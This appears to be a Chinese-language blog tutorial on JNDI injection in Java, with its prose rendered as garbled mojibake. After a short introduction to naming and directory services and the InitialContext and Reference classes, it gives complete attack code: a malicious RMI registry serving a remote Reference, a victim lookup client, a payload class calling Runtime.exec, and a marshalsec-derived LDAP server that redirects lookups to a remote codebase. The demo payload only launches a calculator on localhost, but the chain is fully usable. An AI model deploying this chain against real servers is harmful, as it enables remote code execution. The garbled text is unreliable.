<h2 id="ç›®å½•æœåŠ¡"><a href="#ç›®å½•æœåŠ¡" class="headerlink" title="ç›®å½•æœåŠ¡"></a>ç›®å½•æœåŠ¡</h2><p>ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‹“å±•ã€‚å®ƒä¸å‘½åæœåŠ¡çš„åŒºåˆ«åœ¨äºå®ƒå¯ä»¥é€šè¿‡å¯¹è±¡å±æ€§æ¥æ£€ç´¢å¯¹è±¡ï¼Œè¿™ä¹ˆè¯´å¯èƒ½ä¸å¤ªå¥½ç†è§£ï¼Œæˆ‘ä»¬ä¸¾ä¸ªä¾‹å­ï¼šæ¯”å¦‚ä½ è¦åœ¨æŸä¸ªå­¦æ ¡é‡Œé‡Œæ‰¾æŸä¸ªäººï¼Œé‚£ä¹ˆä¼šé€šè¿‡ï¼šå¹´çº§-&gt;ç­çº§-&gt;å§“åè¿™ç§æ–¹å¼æ¥æŸ¥æ‰¾ï¼Œå¹´çº§ã€ç­çº§ã€å§“åè¿™äº›å°±æ˜¯æŸä¸ªäººçš„å±æ€§ï¼Œè¿™ç§å±‚çº§å…³ç³»å°±å¾ˆåƒç›®å½•å…³ç³»ï¼Œæ‰€ä»¥è¿™ç§å­˜å‚¨å¯¹è±¡çš„æ–¹å¼å°±å«ç›®å½•æœåŠ¡ã€‚</p>
<p>å…¶å®ï¼Œä»”ç»†ä¸€ç¢ç£¨å°±ä¼šæ„Ÿè§‰å…¶å®å‘½åæœåŠ¡ä¸ç›®å½•æœåŠ¡çš„æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯é€šè¿‡é”®æ¥æŸ¥æ‰¾å¯¹è±¡ï¼Œåªä¸è¿‡ç›®å½•æœåŠ¡çš„é”®è¦çµæ´»ä¸”å¤æ‚ä¸€ç‚¹ã€‚</p>
<p>è¿™äº›å‘½å&#x2F;ç›®å½•æœåŠ¡æä¾›è€…:</p>
<ul>
<li>RMI (JAVAè¿œç¨‹æ–¹æ³•è°ƒç”¨)</li>
<li>LDAP (è½»é‡çº§ç›®å½•è®¿é—®åè®®)</li>
<li>CORBA (å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„)</li>
<li>DNS (åŸŸåæœåŠ¡)</li>
</ul>
<p>åˆ°æ­¤å°±å¯ä»¥çŸ¥é“äº†ï¼Œå®ç°JNIDæ³¨å…¥æœ‰2ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯RMIçš„åŠ¨æ€ç±»åŠ è½½ï¼Œä¸€ç›´æ˜¯åˆ©ç”¨LDAPæœåŠ¡ã€‚</p>
<p>ä½†åœ¨æ­¤ä¹‹å‰è¿˜è¦äº†è§£ä¸¤ä¸ªç±»</p>
<h1 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»"></a>InitialContextç±»</h1><h2 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext() </span><br><span class="line">æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚  </span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line">æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚  </span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class="line">ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚ </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>


<p>åœ¨è¿™JDKé‡Œé¢ç»™çš„è§£é‡Šæ˜¯æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå…¶å®é€šä¿—ç‚¹æ¥è®²å°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</p>
<h2 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">  å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚ </span><br><span class="line">list(String name) </span><br><span class="line">  æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚</span><br><span class="line">lookup(String name) </span><br><span class="line">  æ£€ç´¢å‘½åå¯¹è±¡ã€‚ </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">  å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ </span><br><span class="line">unbind(String name) </span><br><span class="line">  å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚ </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Referenceç±»"><a href="#Referenceç±»" class="headerlink" title="Referenceç±»"></a>Referenceç±»</h1><p>è¯¥ç±»ä¹Ÿæ˜¯åœ¨<code>javax.naming</code>çš„ä¸€ä¸ªç±»ï¼Œè¯¥ç±»è¡¨ç¤ºå¯¹åœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æä¾›äº†JNDIä¸­ç±»çš„å¼•ç”¨åŠŸèƒ½ã€‚</p>
<h2 id="æ„é€ æ–¹æ³•-1"><a href="#æ„é€ æ–¹æ³•-1" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">  ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">  ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">  ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">  ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>å‚æ•°1ï¼š<code>className</code> - è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</p>
<p>å‚æ•°2ï¼š<code>classFactory</code> - åŠ è½½çš„<code>class</code>ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°</p>
<p>å‚æ•°3ï¼š<code>classFactoryLocation</code> - æä¾›<code>classes</code>æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯<code>file/ftp/http</code>åè®®</p>
<h2 id="å¸¸ç”¨æ–¹æ³•-1"><a href="#å¸¸ç”¨æ–¹æ³•-1" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line">  å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line">  å°†åœ°å€æ·»åŠ åˆ°åœ°å€åˆ—è¡¨çš„æœ«å°¾ã€‚  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line">  ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line">  æ£€ç´¢åœ°å€ç±»å‹ä¸ºâ€œaddrTypeâ€çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚  </span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line">  æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚  </span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line">  æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚  </span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line">  æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚  </span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line">  æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚    </span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚  </span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line">  æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚  </span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br><span class="line">  ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="JNDIæ³¨å…¥-RMIå®ç°æ”»å‡»"><a href="#JNDIæ³¨å…¥-RMIå®ç°æ”»å‡»" class="headerlink" title="JNDIæ³¨å…¥+RMIå®ç°æ”»å‡»"></a>JNDIæ³¨å…¥+RMIå®ç°æ”»å‡»</h1><p>ä¸‹é¢è¿˜æ˜¯æ¥çœ‹å‡ æ®µä»£ç ï¼Œæ¥åšä¸€ä¸ªåˆ†æå…·ä½“çš„æ”»å‡»æµç¨‹ã€‚</p>
<h2 id="RMIServerä»£ç ï¼š"><a href="#RMIServerä»£ç ï¼š" class="headerlink" title="RMIServerä»£ç ï¼š"></a>RMIServerä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;obj&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="RMIClientä»£ç ï¼š"><a href="#RMIClientä»£ç ï¼š" class="headerlink" title="RMIClientä»£ç ï¼š"></a>RMIClientä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/obj&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¸‹é¢è¿˜éœ€è¦ä¸€æ®µæ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼ŒæŒ‚è½½åœ¨webé¡µé¢ä¸Šè®©serverç«¯å»è¯·æ±‚ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä½¿ç”¨javacå‘½ä»¤ï¼Œå°†è¯¥ç±»ç¼–è¯‘æˆclassæ–‡ä»¶æŒ‚è½½åœ¨webé¡µé¢ä¸Šã€‚</p>
<p>åŸç†å…¶å®å°±æ˜¯æŠŠæ¶æ„çš„<code>Reference</code>ç±»ï¼Œç»‘å®šåœ¨RMIçš„Registry é‡Œé¢ï¼Œåœ¨å®¢æˆ·ç«¯è°ƒç”¨<code>lookup</code>è¿œç¨‹è·å–è¿œç¨‹ç±»çš„æ—¶å€™ï¼Œå°±ä¼šè·å–åˆ°<code>Reference</code>å¯¹è±¡ï¼Œè·å–åˆ°<code>Reference</code>å¯¹è±¡åï¼Œä¼šå»å¯»æ‰¾<code>Reference</code>ä¸­æŒ‡å®šçš„ç±»ï¼Œå¦‚æœæŸ¥æ‰¾ä¸åˆ°åˆ™ä¼šåœ¨<code>Reference</code>ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€å»è¿›è¡Œè¯·æ±‚ï¼Œè¯·æ±‚åˆ°è¿œç¨‹çš„ç±»åä¼šåœ¨æœ¬åœ°è¿›è¡Œæ‰§è¡Œã€‚</p>
<h1 id="JNDIæ³¨å…¥-LDAPå®ç°æ”»å‡»"><a href="#JNDIæ³¨å…¥-LDAPå®ç°æ”»å‡»" class="headerlink" title="JNDIæ³¨å…¥+LDAPå®ç°æ”»å‡»"></a>JNDIæ³¨å…¥+LDAPå®ç°æ”»å‡»</h1><h2 id="LDAPæ¦‚å¿µ"><a href="#LDAPæ¦‚å¿µ" class="headerlink" title="LDAPæ¦‚å¿µ"></a>LDAPæ¦‚å¿µ</h2><p>è½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆè‹±æ–‡ï¼š<code>Lightweight Directory Access Protocol</code>ï¼Œç¼©å†™ï¼š<code>LDAP</code>ï¼‰æ˜¯ä¸€ä¸ªå¼€æ”¾çš„ï¼Œä¸­ç«‹çš„ï¼Œå·¥ä¸šæ ‡å‡†çš„åº”ç”¨åè®®ï¼Œé€šè¿‡IPåè®®æä¾›è®¿é—®æ§åˆ¶å’Œç»´æŠ¤åˆ†å¸ƒå¼ä¿¡æ¯çš„ç›®å½•ä¿¡æ¯ã€‚</p>
<p>æœ‰äº†å‰é¢çš„æ¡ˆä¾‹åï¼Œå†æ¥çœ‹è¿™ä¸ªå…¶å®ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¹‹æ‰€ä»¥JNDIæ³¨å…¥ä¼šé…åˆLDAPæ˜¯å› ä¸ºLDAPæœåŠ¡çš„Referenceè¿œç¨‹åŠ è½½Factoryç±»ä¸å—<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>ç­‰å±æ€§çš„é™åˆ¶ã€‚</p>
<p>å¯åŠ¨ä¸€ä¸ªldapæœåŠ¡ï¼Œè¯¥ä»£ç ç”±æŸå¤§ä½¬æ”¹è‡ªmarshalsecã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8080/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


